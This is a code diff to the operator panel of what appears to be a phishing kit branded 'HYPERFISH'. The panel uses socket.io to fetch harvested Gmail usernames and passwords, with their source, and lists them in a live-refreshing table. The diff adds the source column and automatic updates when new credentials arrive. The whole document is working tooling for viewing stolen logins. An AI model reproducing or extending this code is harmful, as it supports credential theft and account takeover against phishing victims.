@@ -19,9 +19,9 @@
 </center>
                 <table id="table" >
                         <tr>
+                          <th>From</th>
                           <th>Username</th>
                           <th>Password</th>
-                          <th>Notes</th>
                         </tr>
                         
                       </table>
@@ -33,34 +33,32 @@
 <script>
 
 var socket = io();
-var art1 = `
-██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ ███████╗██╗███████╗██╗  ██╗
-██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝██║  ██║
-███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝█████╗  ██║███████╗███████║
-██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗██╔══╝  ██║╚════██║██╔══██║
-██║  ██║   ██║   ██║     ███████╗██║  ██║██║     ██║███████║██║  ██║
-╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝`
+
 
 
 $( window ).load(function() {
 
   socket.emit('queryCredentials')
 });
-socket.on('queriedCredentials', function(gmail, password){
 
-    document.getElementById('table').innerHTML += "<tr><td>" + gmail + "</td><td>" + password + "</td><td><input type='text'></input></td></tr>"
-    
+socket.on('queriedCredentials', function(from, gmail, password){
+    document.getElementById('table').innerHTML += "<tr><td>" + from + "</td><td>" + gmail + "</td><td>" + password + "</td></tr>"
+})
+socket.on('newData', function(){
+    socket.emit('queryCredentials')
 })
 </script>
 <style>
     #main-content-div{
         position: absolute;
-        height:100%;
-        width:100%;
+ 
         top:0px;
         bottom:0px;
         right:0px;
         left:0px;
+        background:#1c2125;
+    }
+    body{
         background:#1c2125;
     }
     table {
@@ -79,7 +77,13 @@ socket.on('queriedCredentials', function(gmail, password){
     border-style: hidden; /* hide standard table (collapsed) border */
 
 }
-
+table input{
+    background: transparent;
+    border:none;
+}
+xmp{
+    color:#2980b9;
+}
 td, th {
 
     text-align: left;
